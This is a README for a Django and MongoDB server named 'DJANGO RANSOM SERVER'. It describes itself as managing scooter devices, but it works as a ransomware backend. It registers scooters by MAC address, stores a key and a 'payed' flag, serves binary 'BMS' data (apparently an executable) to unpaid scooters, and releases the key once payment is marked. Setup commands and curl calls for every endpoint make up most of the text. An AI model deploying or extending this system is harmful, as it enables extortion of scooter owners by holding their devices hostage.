# DJANGO RANSOM SERVER

API server for managing scooter devices with local MongoDB database.

---

## Prerequisites

- Python 3.8+
- MongoDB Community Edition (for local database)
- pip (Python package manager)
- curl (for testing APIs)

---

## Installation

### 1. Install system dependencies (Debian/Ubuntu)

```bash
# Update package manager
sudo apt-get update

# Install Python and dependencies
sudo apt-get install -y python3 python3-pip python3-dev gnupg curl

# Install MongoDB Community Edition
curl -fsSL https://www.mongodb.org/static/pgp/server-7.0.asc | sudo gpg --dearmor -o /usr/share/keyrings/mongodb-server-7.0.gpg
echo "deb [ arch=amd64,arm64 signed-by=/usr/share/keyrings/mongodb-server-7.0.gpg ] https://repo.mongodb.org/apt/ubuntu jammy/mongodb-org/7.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-7.0.list
sudo apt-get update
sudo apt-get install -y mongodb-org

# Install MongoDB Shell (mongosh)
sudo apt-get install -y mongosh
```

**For Fedora/CentOS** (not available with dnf):
```bash
# Download from source
cd /tmp
wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-fedora38-7.0.0.tgz
tar -xzf mongodb-linux-x86_64-fedora38-7.0.0.tgz
sudo mkdir -p /opt/mongodb
sudo cp -r mongodb-linux-x86_64-fedora38-7.0.0/* /opt/mongodb/
# Add to PATH
export PATH=$PATH:/opt/mongodb/bin
```

### 2. Install Python dependencies (pip)

```bash
# Navigate to project folder
cd ransom-server

# Upgrade pip
pip install --upgrade pip

# Install Python dependencies
pip install djangorestframework
pip install mongoengine
pip install pymongo
pip install pytz
pip install python-dotenv  # (optional, for environment variables)
```

Or use requirements.txt if available:
```bash
pip install -r requirements.txt
```

---

## Configuration

### Local MongoDB

The `settings.py` file is already configured for local MongoDB:

```python
me.connect(
    db='ransomware_db',
    host='mongodb://localhost:27017/',
    tz_aware=True
)
```

To change the database name or host, modify `ransomserver/settings.py`.

---

## Starting the Server

### 1. Start MongoDB

```bash
sudo systemctl start mongod
sudo systemctl status mongod  # Check status
```

Verify MongoDB is running:
```bash
mongosh
# You should see the prompt >
exit
```

### 2. Start Django server

```bash
# Navigate to project folder
cd ransom-server

# Start the server
python3 manage.py runserver 0.0.0.0:8000
```

You should see:
```
Starting development server at http://0.0.0.0:8000/
```

The server is accessible at `http://localhost:8000/` locally.
---

## API Endpoints

### Base URL
```
http://localhost:8000/api/ransom/
```

### 1. List all scooters (GET)

**Endpoint:**
```
GET /api/ransom/
```

**curl command:**
```bash
curl -X GET http://localhost:8000/api/ransom/ \
  -H "Content-Type: application/json"
```

**Response:**
```json
[
  {
    "mac": "AA-BB-CC-DD-EE-FF",
    "key": "a1b2c3d4e5f6g7h8",
    "payed": false
  }
]
```

---

### 2. Create a new scooter (POST)

**Endpoint:**
```
POST /api/ransom/
```

**curl command:**
```bash
curl -X POST http://localhost:8000/api/ransom/ \
  -H "Content-Type: application/json" \
  -d '{"mac": "AA-BB-CC-DD-EE-FF"}'
```

**Parameters:**
- `mac` (string, required): Scooter MAC address (max 17 characters)

**Response (201 Created):**
```json
{
  "mac": "AA-BB-CC-DD-EE-FF",
  "key": "a1b2c3d4e5f6g7h8",
  "payed": false
}
```

**Errors:**
- `400 Bad Request`: Duplicate or invalid MAC
- `500 Server Error`: Database error

---

### 3. Get scooter details (GET)

**Endpoint:**
```
GET /api/ransom/{mac}
```

If `payed` is `false`, returns BMS (binary) data. If `payed` is `true`, returns the key.

**curl command (unpaid scooter - gets BMS):**
```bash
curl -X GET http://localhost:8000/api/ransom/AA-BB-CC-DD-EE-FF \
  -H "Content-Type: application/json"
```

**Response (BMS for unpaid):**
```json
{
  "bms": "7f454c4602010100000000000000000..."
}
```

**Response (Key for paid):**
```json
{
  "key": "a1b2c3d4e5f6g7h8"
}
```

**Errors:**
- `404 Not Found`: Scooter does not exist

---

### 4. Update payment status (PUT)

**Endpoint:**
```
PUT /api/ransom/{mac}
```

**curl command:**
```bash
curl -X PUT http://localhost:8000/api/ransom/AA-BB-CC-DD-EE-FF \
  -H "Content-Type: application/json" \
  -d '{"payed": true}'
```

**Parameters:**
- `payed` (boolean): `true` for paid, `false` for unpaid

**Response (200 OK):**
```json
{
  "mac": "AA-BB-CC-DD-EE-FF",
  "key": "a1b2c3d4e5f6g7h8",
  "payed": true
}
```

**Errors:**
- `404 Not Found`: Scooter does not exist
- `400 Bad Request`: Invalid data

---

## Project Structure

```
ransom-server/
├── manage.py                 # Django CLI
├── requirements.txt          # Python dependencies
├── ransomserver/             # Django configuration
│   ├── settings.py           # Configuration (database, apps, etc)
│   ├── urls.py               # Main URLs
│   ├── wsgi.py               # WSGI for deployment
│   └── asgi.py               # ASGI for async
├── ransom/                   # Main app
│   ├── models.py             # MongoDB models (Scooter)
│   ├── api/
│   │   ├── views.py          # API endpoints
│   │   ├── serializers.py    # Data serializers
│   │   └── urls.py           # API URLs
│   └── migrations/           # Not used with MongoEngine
└── readme.md                 # This file
```


